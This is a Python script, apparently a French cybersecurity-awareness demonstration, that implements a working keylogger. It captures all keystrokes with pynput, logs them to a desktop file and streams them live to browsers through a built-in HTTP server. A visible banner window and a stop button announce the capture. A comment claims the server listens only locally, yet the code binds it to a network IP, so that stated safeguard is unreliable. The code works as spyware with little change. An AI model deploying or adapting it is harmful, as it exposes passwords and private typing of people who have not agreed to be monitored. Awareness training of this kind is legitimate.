from pynput.keyboard import Listener, Key
import logging
import json
import queue
import threading
import tkinter as tk
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# ---------------------------------------------------------------------------
# Fichier de logs contenant les frappes
# ---------------------------------------------------------------------------

log_filename = rf"C:\Users\Formateur Attaquant\Desktop\keylog_{datetime.now().strftime('%Y-%m-%d')}.txt"

logging.basicConfig(
    filename=log_filename,
    level=logging.INFO,
    format="%(asctime)s: %(message)s"
)

logging.info("Démarrage du script")

# ---------------------------------------------------------------------------
# Serveur web de sensibilisation : streaming live des frappes (SSE)
# ---------------------------------------------------------------------------

HOST = "10.212.197.249"   # écoute uniquement en local (démo). Mettre "0.0.0.0" pour l'exposer sur le réseau.
PORT = 8080

# Chaque client connecté possède sa propre file. On y pousse les évènements.
_clients = []
_clients_lock = threading.Lock()


def broadcast(texte):
    """Envoie un évènement à tous les navigateurs connectés."""
    evenement = {
        "heure": datetime.now().strftime("%H:%M:%S"),
        "texte": texte,
    }
    with _clients_lock:
        for q in list(_clients):
            q.put(evenement)


PAGE_HTML = f"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sensibilisation Keylogger - Flux en direct</title>
<style>
  :root {{ color-scheme: dark; }}
  * {{ box-sizing: border-box; }}
  body {{
    margin: 0; font-family: "Segoe UI", system-ui, sans-serif;
    background: #0d1117; color: #e6edf3; height: 100vh;
    display: flex; flex-direction: column;
  }}
  header {{
    padding: 16px 24px; background: #161b22; border-bottom: 1px solid #30363d;
    display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
  }}
  header h1 {{ font-size: 18px; margin: 0; }}
  .pill {{
    font-size: 12px; padding: 4px 10px; border-radius: 999px;
    background: #21262d; border: 1px solid #30363d;
  }}
  .live {{ color: #ff7b72; }}
  .live::before {{
    content: "●"; margin-right: 6px; animation: blink 1s steps(2, start) infinite;
  }}
  @keyframes blink {{ to {{ visibility: hidden; }} }}
  .warn {{
    padding: 10px 24px; background: #341a1a; color: #ffb3ab;
    font-size: 13px; border-bottom: 1px solid #30363d;
  }}
  main {{ flex: 1; overflow-y: auto; padding: 16px 24px; }}
  #flux {{
    white-space: pre-wrap; word-break: break-word;
    font-family: "Cascadia Code", Consolas, monospace; font-size: 16px;
    line-height: 1.6;
  }}
  .special {{ color: #79c0ff; }}
  .h {{ color: #6e7681; font-size: 11px; }}
  footer {{
    padding: 8px 24px; font-size: 12px; color: #6e7681;
    border-top: 1px solid #30363d;
  }}
</style>
</head>
<body>
  <header>
    <h1>⌨️ Keylogger — Flux en direct</h1>
    <span class="pill live" id="statut">En attente…</span>
    <span class="pill">Fichier : keylog_{datetime.now().strftime('%Y-%m-%d')}.txt</span>
  </header>
  <div class="warn">
    ⚠️ Démonstration de sensibilisation. Ce que vous tapez sur cette machine s'affiche ici en temps réel :
    c'est exactement ce qu'un keylogger malveillant transmettrait à un attaquant.
  </div>
  <main><span id="flux"></span></main>
  <footer>Appuyez sur <b>Échap</b> sur la machine pour arrêter la capture.</footer>
<script>
  const flux = document.getElementById("flux");
  const statut = document.getElementById("statut");
  const main = document.querySelector("main");
  const source = new EventSource("/stream");

  source.onopen = () => statut.textContent = "Connecté — capture en direct";

  source.onmessage = (e) => {{
    const data = JSON.parse(e.data);
    let t = data.texte;
    const span = document.createElement("span");
    // Mise en évidence des touches spéciales entre crochets
    if (t.startsWith(" [") && t.endsWith("] ")) {{
      span.className = "special";
    }}
    span.textContent = (t === "\\n") ? "\\n" : t;
    flux.appendChild(span);
    main.scrollTop = main.scrollHeight;
  }};

  source.onerror = () => statut.textContent = "Déconnecté (script arrêté ?)";
</script>
</body>
</html>
"""


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass  # silence les logs HTTP dans la console

    def do_GET(self):
        if self.path == "/":
            corps = PAGE_HTML.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(corps)))
            self.end_headers()
            self.wfile.write(corps)

        elif self.path == "/stream":
            self.send_response(200)
            self.send_header("Content-Type", "text/event-stream")
            self.send_header("Cache-Control", "no-cache")
            self.send_header("Connection", "keep-alive")
            self.end_headers()

            q = queue.Queue()
            with _clients_lock:
                _clients.append(q)
            try:
                while True:
                    try:
                        evenement = q.get(timeout=15)
                        data = json.dumps(evenement, ensure_ascii=False)
                        self.wfile.write(f"data: {data}\n\n".encode("utf-8"))
                    except queue.Empty:
                        # commentaire SSE = ping pour garder la connexion ouverte
                        self.wfile.write(b": ping\n\n")
                    self.wfile.flush()
            except (BrokenPipeError, ConnectionResetError):
                pass
            finally:
                with _clients_lock:
                    if q in _clients:
                        _clients.remove(q)
        else:
            self.send_error(404)


def demarrer_serveur():
    serveur = ThreadingHTTPServer((HOST, PORT), Handler)
    print(f"Serveur web de sensibilisation : http://{HOST}:{PORT}")
    serveur.serve_forever()


# Serveur lancé en arrière-plan (thread démon = s'arrête avec le script)
threading.Thread(target=demarrer_serveur, daemon=True).start()

# ---------------------------------------------------------------------------
# Capture des frappes
# ---------------------------------------------------------------------------

buffer = ""  # Stocke les dernières frappes pour le mot-clé d'arrêt

def on_press(key):
    global buffer
    try:
        # Capture des lettres et chiffres
        touche = key.char
        buffer += touche
        logging.info(touche)
        broadcast(touche)
    except AttributeError:
        try:
            # Gestion des touches spéciales
            if key == Key.space:
                buffer += " "
                logging.info(" [ESPACE] ")
                broadcast(" ")
            elif key == Key.enter:
                buffer += "\n"
                logging.info(" [ENTREE] ")
                broadcast("\n")
            elif key == Key.tab:
                buffer += "\t"
                logging.info(" [TABULATION] ")
                broadcast(" [TABULATION] ")
            elif key == Key.backspace:
                buffer = buffer[:-1]
                logging.info(" [SUPPR] ")
                broadcast(" [SUPPR] ")
            else:
                logging.info(f" [{key}] ")
                broadcast(f" [{key}] ")
        except Exception as e:
            print(f"Erreur lors du traitement de la touche : {e}")

def on_release(key):
    # Arrêt si touche Échap
    if key == Key.esc:
        print("Touche Échap pressée. Keylogger arrêté.")
        return False

# ---------------------------------------------------------------------------
# Lancement de la démonstration
# ---------------------------------------------------------------------------

listener = Listener(on_press=on_press, on_release=on_release)
listener.start()

# Indicateur local visible : le navigateur ne s'ouvre plus automatiquement.
# Le tableau de bord reste consultable manuellement depuis un navigateur
# autorisé sur : http://HOST:PORT
fenetre = tk.Tk()
fenetre.title("Sensibilisation cybersécurité — capture clavier active")
fenetre.geometry("500x180+20+20")
fenetre.resizable(False, False)
fenetre.attributes("-topmost", True)

tk.Label(
    fenetre,
    text="DÉMONSTRATION DE SENSIBILISATION ACTIVE",
    font=("Segoe UI", 12, "bold")
).pack(pady=(18, 8))

tk.Label(
    fenetre,
    text=(
        "Les frappes saisies sur cette machine sont capturées dans le cadre "
        "de cette démonstration.\n"
        f"Tableau de bord : http://{HOST}:{PORT}"
    ),
    font=("Segoe UI", 10),
    justify="center"
).pack(padx=15)

def arreter_demo():
    listener.stop()
    fenetre.destroy()

tk.Button(
    fenetre,
    text="Arrêter la démonstration",
    command=arreter_demo,
    font=("Segoe UI", 10)
).pack(pady=14)

def verifier_listener():
    if listener.running:
        fenetre.after(250, verifier_listener)
    else:
        fenetre.destroy()

fenetre.after(250, verifier_listener)
fenetre.mainloop()
listener.join()
